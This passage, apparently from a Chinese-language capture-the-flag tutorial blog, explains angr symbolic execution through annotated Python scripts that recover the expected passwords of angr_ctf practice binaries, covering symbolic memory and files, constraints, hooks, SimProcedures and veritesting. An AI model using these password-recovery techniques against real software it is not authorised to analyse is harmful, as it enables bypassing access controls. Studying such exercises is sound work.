class="params">(argv)</span>:</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  start_address = <span class="number">0x8048699</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line">  password0 = claripy.BVS(<span class="string">'password0'</span>, <span class="number">64</span>)</span><br><span class="line">  password1 = claripy.BVS(<span class="string">'password1'</span>, <span class="number">64</span>)</span><br><span class="line">  <span class="comment">#首先找到buffer0的地址0xABCC8A4</span></span><br><span class="line">  <span class="comment">#然后用任意的一个内存块地址（这里用的0xABCC760）覆盖buffer0的值</span></span><br><span class="line">  fake_heap_address0 = <span class="number">0xABCC760</span></span><br><span class="line">  pointer_to_malloc_memory_address0 = <span class="number">0xABCC8A4</span></span><br><span class="line">  <span class="comment">#这里是在进行覆盖，但是memory.store默认是大端序，需要指定endness设置为自己架构的端序。</span></span><br><span class="line">  <span class="comment">#project.arch.memory_endness代表就是当前运行的架构端序</span></span><br><span class="line">  initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness)</span><br><span class="line">  fake_heap_address1 = <span class="number">0xABCC780</span></span><br><span class="line">  pointer_to_malloc_memory_address1 = <span class="number">0x0ABCC8AC</span></span><br><span class="line">  initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness)</span><br><span class="line">  <span class="comment">#将指向数据指针修改为已知的地址之后，可以如题05一样把存放输入变量与我们创建的位向量绑定在一起。</span></span><br><span class="line">  initial_state.memory.store(fake_heap_address0, password0)</span><br><span class="line">  initial_state.memory.store(fake_heap_address1, password1)</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    solution0 = solution_state.se.eval(password0,cast_to=bytes).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    solution1 = solution_state.se.eval(password1,cast_to=bytes).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    solution = <span class="string">r"%8s %8s"</span>%(solution0,solution1)</span><br><span class="line">    print(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="07_angr_symbolic_file">07_angr_symbolic_file</span></h3><p>本题是通过从文件获取信息来读取password。原作者为了维持所有程序的一致性，因此在终端写入需要输入password。这个password在ignore_me的函数中将password写入了文件。正如作者所说，不用理会这个函数。我们就只需要当作程序是从文件中获取输入即可。</p><p><img src="14.png" alt></p><p>本题处理手法众多，可以用上述的05题的办法来弄出password。为了学习如何处理文件，这里只用符号化的手法来处理文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line">  <span class="comment">#此时的开始地址为从读入文件开始</span></span><br><span class="line">  start_address = <span class="number">0x080488ED</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line">  <span class="comment">#读取的文件名</span></span><br><span class="line">  filename = <span class="string">r'OJKSQYDP.txt'</span>  <span class="comment"># :string</span></span><br><span class="line">  <span class="comment">#看似读入64个字节，但是只处理和判断了前8个字节</span></span><br><span class="line">  symbolic_file_size_bytes = <span class="number">8</span></span><br><span class="line">  <span class="comment">#创建一个位向量</span></span><br><span class="line">  password = claripy.BVS(<span class="string">'password'</span>, symbolic_file_size_bytes * <span class="number">8</span>)</span><br><span class="line">  <span class="comment"># 创建一个符号文件，content指定的是文件内容</span></span><br><span class="line">  password_file = angr.storage.SimFile(filename, content=password)</span><br><span class="line">  <span class="comment"># 将我们创建的符号文件加入到符号文件系统中，因此模拟器读取的文件就是我们创建符号文件。</span></span><br><span class="line">  initial_state.fs.insert(filename,password_file)</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    solution = solution_state.se.eval(password,cast_to=bytes).decode(<span class="string">"UTF-8"</span>)</span><br><span class="line"></span><br><span class="line">    print(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="小总结-02">小总结 02</span></h3><p>上述几个题的思路都是使我们创建的位向量与存放输入的变量的位置对应起来或者是用位向量的值代替输入值（如07题）。其实很容易联想到，位向量的改变就相当于原程序启动之后输入值的改变。angr就是在模拟程序运行，不断地改变位向量的值模拟运行到达预期结果，最后得到正确的输入值。</p><h3><span id="08_angr_constraints">08_angr_constraints</span></h3><p>本题介绍如何添加约束。</p><p><img src="15.png" alt></p><p><img src="16.png" alt></p><p><img src="17.png" alt></p><p>依据前面的经验，我们需要从scanf之后指定开始地址。但是本题的判断条件不像前面以字符常量的形式与我们输入的值进行比较。如果按照前面那么做，首先模拟器在模拟时，password上并没有值，给password赋值的代码在scanf前面。其次在check函数中，字符串比较时一个一个字符比较，这会产生路径爆炸。每一次循环会产生两个结果（正确或错误），这么来说会有2^16次比较结果，这样做很浪费时间。因此可以手动添加约束条件来代替这个判断函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  start_address = <span class="number">0x8048625</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">  password = claripy.BVS(<span class="string">'password'</span>, <span class="number">16</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">  password_address = <span class="number">0x804A050</span></span><br><span class="line">  initial_state.memory.store(password_address, password)</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line">  <span class="comment">#到达判断函数前停止</span></span><br><span class="line">  address_to_check_constraint = <span class="number">0x8048673</span> </span><br><span class="line">  simulation.explore(find=address_to_check_constraint)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#将计算过的password的位向量获取出来赋值给约束位向量</span></span><br><span class="line">    constrained_parameter_address =  <span class="number">0x804A050</span></span><br><span class="line">    constrained_parameter_size_bytes = <span class="number">16</span></span><br><span class="line">    constrained_parameter_bitvector = solution_state.memory.load(</span><br><span class="line">      constrained_parameter_address,</span><br><span class="line">      constrained_parameter_size_bytes</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#判断成功的结果</span></span><br><span class="line">    constrained_parameter_desired_value = <span class="string">r"AUPDNNPROEZRJWKB"</span> <span class="comment"># :string</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#约束位向量与成功的结果比较，相等则继续，不相等则本次模拟结果不成功，跳过进行下一次模拟。</span></span><br><span class="line">    solution_state.add_constraints(constrained_parameter_bitvector == constrained_parameter_desired_value)</span><br><span class="line"></span><br><span class="line">    solution = solution_state.solver.eval(password,cast_to=bytes).decode(<span class="string">"UTF-8"</span>)</span><br><span class="line">    print(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="09_angr_hooks">09_angr_hooks</span></h3><p>本题介绍了Angr的hooks方式，将跳过的函数替换为自己的函数</p><p><img src="18.png" alt></p><p><img src="19.png" alt></p><p>如题，获取一段输入之后加密进入check_equals函数并将比较结果保存。然后再获取一段输入之后和加密之后的password直接比较。</p><p>依据上一题的经验，进入check_equals函数会造成路径爆炸。因此我们需要跳过它，上述红框的地方就是我们需要跳过的地方。后面的代码功能我们完全可以依靠angr完成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line">  <span class="comment">#这里我们可以从函数开头进入，因为没有多个变量接受输入值。</span></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  <span class="comment">#我们需要跳过的函数地址的起始</span></span><br><span class="line">  check_equals_called_address = <span class="number">0x80486A9</span> </span><br><span class="line">  <span class="comment">#需要跳过的字节长度=0x80486BB-0x80486A9</span></span><br><span class="line">  instruction_to_skip_length = <span class="number">18</span></span><br><span class="line"><span class="meta">  @project.hook(check_equals_called_address, length=instruction_to_skip_length)</span></span><br><span class="line">  <span class="comment">#此函数用来代替check_equals函数</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">skip_check_equals_</span><span class="params">(state)</span>:</span></span><br><span class="line">    <span class="comment">#类似与上一题将加密后的值读出来</span></span><br><span class="line">    user_input_buffer_address = <span class="number">0x804A054</span> <span class="comment"># :integer, probably hexadecimal</span></span><br><span class="line">    user_input_buffer_length = <span class="number">16</span></span><br><span class="line">    user_input_string = state.memory.load(</span><br><span class="line">      user_input_buffer_address, </span><br><span class="line">      user_input_buffer_length)</span><br><span class="line">    </span><br><span class="line">    check_against_string = <span class="string">r'XYMKBKUHNIQYNQXE'</span> <span class="comment"># :string</span></span><br><span class="line">    <span class="comment">#比较加密后的值与预期的值，并将返回值给eax.因为在原程序中，函数的返回结果给了eax.</span></span><br><span class="line">    state.regs.eax = claripy.If(</span><br><span class="line">      user_input_string == check_against_string, </span><br><span class="line">      claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), </span><br><span class="line">      claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#将正确路径的输入结果打印出来</span></span><br><span class="line">    solution = solution_state.posix.dumps(sys.stdin.fileno())</span><br><span class="line">    print(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="10_angr_simprocedures">10_angr_simprocedures</span></h3><p>本题介绍了一个类似hook的方式。试想在上一题中，check_equals函数被多次调用，我们不能在每次调用的地方进行hook,这样肯定使不合理的而且也无聊。因此angr提供了一个simprocedures的功能，可以用来hook一个函数。我们可以将check_equals函数给hook为我们自己的函数。</p><p><img src="20.png" alt></p><p>如题我们只需要将check_equals_ORSDDWXHZURJRBDH函数hook为我们自己处理函数即可。angr操作如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line">  <span class="comment">#定义一个类继承于simProcedure</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReplacementCheckEquals</span><span class="params">(angr.SimProcedure)</span>:</span></span><br><span class="line">    <span class="comment">#需要被hook函数的参数列表，这里被hook的是check_equals_ORSDDWXHZURJRBDH的参数列表</span></span><br><span class="line">    <span class="comment">#to_check即为上图中的s，length为上图中16，hook成功则该函数的实参自动传递进来</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, to_check, length)</span>:</span></span><br><span class="line">      user_input_buffer_address = to_check</span><br><span class="line">      user_input_buffer_length = length</span><br><span class="line">      user_input_string = self.state.memory.load(</span><br><span class="line">        user_input_buffer_address,</span><br><span class="line">        user_input_buffer_length)</span><br><span class="line">      check_against_string = <span class="string">r"ORSDDWXHZURJRBDH"</span></span><br><span class="line">      <span class="comment">#函数返回值要与被hook函数的值类型相同</span></span><br><span class="line">      <span class="keyword">return</span> claripy.If(check_against_string==user_input_string, claripy.BVV(<span class="number">1</span>,<span class="number">32</span>), claripy.BVV(<span class="number">0</span>,<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">  <span class="comment">#被hook函数的符号，如果没有符号可以使用project.hook(),第一个参数即可以替换为被hook函数的起始地址。</span></span><br><span class="line">  check_equals_symbol = <span class="string">r"check_equals_ORSDDWXHZURJRBDH"</span> <span class="comment"># :string</span></span><br><span class="line">  project.hook_symbol(check_equals_symbol, ReplacementCheckEquals())</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    solution = solution_state.posix.dumps(sys.stdin.fileno())</span><br><span class="line">    print(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="11_angr_sim_scanf">11_angr_sim_scanf</span></h3><p>本题介绍如何hook掉scanf函数。同时介绍了如何在hook函数内部将位向量传递出来。</p><p><img src="22.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span><span class="params">(angr.SimProcedure)</span>:</span></span><br><span class="line">     <span class="comment">#此时的参数列表要和scanf一样，同时scanf的实参是可以通过该参数列表获得的</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, format_string, scanf0_address, scanf1_address)</span>:</span></span><br><span class="line">      <span class="comment">#生成两个位向量，处理办法和前面绑定输入变量的方法一样</span></span><br><span class="line">      scanf0 = claripy.BVS(<span class="string">'scanf0'</span>, <span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">      scanf1 = claripy.BVS(<span class="string">'scanf1'</span>, <span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">      self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">      self.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness)</span><br><span class="line">      <span class="comment">#因为这里生成的位向量是在simProcedure中，需要把他传递出去，因此设置给该路径的全局变量</span></span><br><span class="line">      self.state.globals[<span class="string">'solution0'</span>] = scanf0</span><br><span class="line">      self.state.globals[<span class="string">'solution1'</span>] = scanf1</span><br><span class="line">  <span class="comment">#和上题hook的做法一样</span></span><br><span class="line">  scanf_symbol = <span class="string">r"__isoc99_scanf"</span></span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span><span class="params">(state)</span>:</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#找到正确路径，获取该路径在ReplacementScanf中设置的位向量，即正确的输入。</span></span><br><span class="line">    stored_solutions0 = solution_state.globals[<span class="string">'solution0'</span>]</span><br><span class="line">    stored_solutions1 = solution_state.globals[<span class="string">'solution1'</span>]</span><br><span class="line">    solution =<span class="string">r"%u %u"</span>%(solution_state.solver.eval(stored_solutions0),solution_state.solver.eval(stored_solutions1))</span><br><span class="line">    print(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h3><span id="12_angr_veritesting">12_angr_veritesting</span></h3><p>angr有两种路径生成方式，动态符号执行(DSE)和静态符号执行(SSE)。前者为路径生成公式，在生成公式时会产生很高的负载，但是公式很容易解。后者为语句生成公式，公式能覆盖很多路径，但是公式难解。SSE不能针对大规模程序分析。Veritesting结合了DSE和SSE，减少了路径爆炸的影响，因此在生成模拟器的时候将Veritesting设置为True即可。</p><p><img src="21.png" alt></p><p>可以看到本题，无法避免路径爆炸。比较字符时，使用输入字符串与生成的字符串一一比较。如果不设置veritesting，则会导致路径爆炸的情况出现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv)</span>:</span></span><br><span class="line">    path_to_binary=argv[<span class="number">1</span>]</span><br><span class="line">    project=angr.Project(path_to_binary)</span><br><span class="line">    initial_state=project.factory.entry_state()</span><br><span class="line">    <span class="comment">#将veritesting设置为True</span></span><br><span class="line">    simulation = project.factory.simgr(initial_state,veritesting=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span 